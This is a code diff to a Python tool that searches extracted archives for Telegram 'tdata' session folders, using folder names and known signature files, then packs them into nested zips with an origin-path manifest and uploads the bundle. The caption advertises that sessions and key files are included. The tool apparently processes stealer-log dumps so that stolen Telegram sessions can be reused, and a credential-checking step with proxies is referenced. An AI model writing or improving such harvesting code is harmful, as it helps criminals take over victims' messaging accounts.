@@ -1048,41 +1048,89 @@ def check_auths(auths):
             "ck_proxies": len(proxies)}
 
 def find_tdata(root):
-    """Every Telegram tdata folder at any depth (tdata, tdata1, tdata2…)."""
+    """Exact-name match first: every folder literally named tdata / tdata2…
+    at any depth. If NOTHING in the archive is named tdata, the signature
+    files catch it (D877F783D4D88E81, map0/map1, key_datas, usertag…)."""
     out = []
     for p in root.rglob("*"):
         try:
-            if not p.is_dir():
-                continue
+            is_dir = p.is_dir()
         except OSError:
             continue
+        if not is_dir:
+            continue
         n = p.name.lower()
-        if n == "tdata" or (n.startswith("tdata") and (len(n) == 5 or n[5:].isdigit())):
-            # skip nested tdata subfolders already covered by a parent hit
-            if not any(a != p and str(p).startswith(str(a) + os.sep) for a in out):
+        if n == "tdata" or (n.startswith("tdata")
+                            and (len(n) == 5 or n[5:].isdigit())):
+            if not any(str(p).startswith(str(a) + os.sep) for a in out):
                 out.append(p)
-    return out
+    sig = {"d877f783d4d88e81", "map0", "map1", "key_datas", "usertag",
+           "shortcuts-default", "key_data"}
+    extra = []
+    for p in root.rglob("*"):
+        try:
+            is_dir = p.is_dir()
+        except OSError:
+            continue
+        if not is_dir:
+            continue
+        try:
+            names = {c.name.lower() for c in p.iterdir()}
+        except OSError:
+            continue
+        if not sig & names:
+            continue
+        covered = any(str(p) == str(a) or str(p).startswith(str(a) + os.sep)
+                      for a in out + extra)
+        if not covered:
+            extra.append(p)
+    return out + extra
 
 def pack_tdata(dirs):
-    """All found folders in ONE tdata.zip under td_1st/, td_2nd/… prefixes."""
+    """Each found tdata folder -> its own zip named with the folder's EXACT
+    name (tdata.zip, tdata1.zip, …duplicates get _2). All inner zips live in
+    ONE tdata.zip next to found_in.txt, which logs every origin path."""
     if not dirs:
         return None, 0
+    import io
     zp = OUT / "tdata.zip"
-    total = 0
-    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
-        for i, d in enumerate(dirs, 1):
-            pre = "td_%s_%s" % (ordn(i), re.sub(r"[^\w.-]", "_", d.name.lower()))
-            n = 0
-            for f in sorted(d.rglob("*")):
-                try:
-                    if f.is_file():
-                        z.write(f, pre + "/" + str(f.relative_to(d)))
-                        n += 1
-                except Exception:
-                    pass
-            if not n:
-                z.writestr(pre + "/EMPTY", "")
-            total += 1
+    manifest, used, total = [], {""}, 0
+    base = WORK / "ex"
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as big:
+        for d in dirs:
+            try:
+                rel = str(d.relative_to(base))
+            except Exception:
+                rel = d.name
+            name = re.sub(r"[^\w.-]", "_", d.name) or "tdata"
+            inner = name + ".zip"
+            k = 2
+            while inner.lower() in used:
+                inner = "%s_%d.zip" % (name, k)
+                k += 1
+            used.add(inner.lower())
+            buf = io.BytesIO()
+            files = 0
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as iz:
+                for f in sorted(d.rglob("*")):
+                    try:
+                        r = str(f.relative_to(d))
+                        if f.is_file():
+                            iz.write(f, r)
+                            files += 1
+                        elif f.is_dir():
+                            iz.writestr(zipfile.ZipInfo(r.rstrip("/") + "/"), "")
+                    except Exception:
+                        pass
+            if files:
+                big.writestr(inner, buf.getvalue())
+                total += 1
+                manifest.append("%s  <-  %s" % (inner, rel))
+            else:
+                manifest.append("(empty) %s  <-  %s" % (inner, rel))
+        big.writestr("found_in.txt",
+                     "TDATA FOLDERS FOUND IN THE ARCHIVE\n%s\n%s\n\n" %
+                     ("=" * 48, "\n".join(manifest)))
     return zp, total
 
 def finish(task, stage, **extra):
@@ -1147,8 +1195,10 @@ def process(task):
         cap = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
                % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
                f"🗃 {bold('Folders')}  {code(td_total)}\n"
-               f"🗂 {bold('Layout')}  one tdata.zip · td_1st_tdata/, td_2nd_tdata/…\n"
-               f"📎 Upload in a moment — sessions, map0 and key files included.")
+               f"🗂 {bold('Layout')}  one tdata.zip · every inner zip keeps the "
+               f"folder's exact name (tdata.zip, tdata1.zip…)\n"
+               f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
+               f"📎 Sessions, map0/map1 and key files all included.")
         td_sent = upload(str(td_zip), cap)
     ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
     shutil.rmtree(WORK, ignore_errors=True)
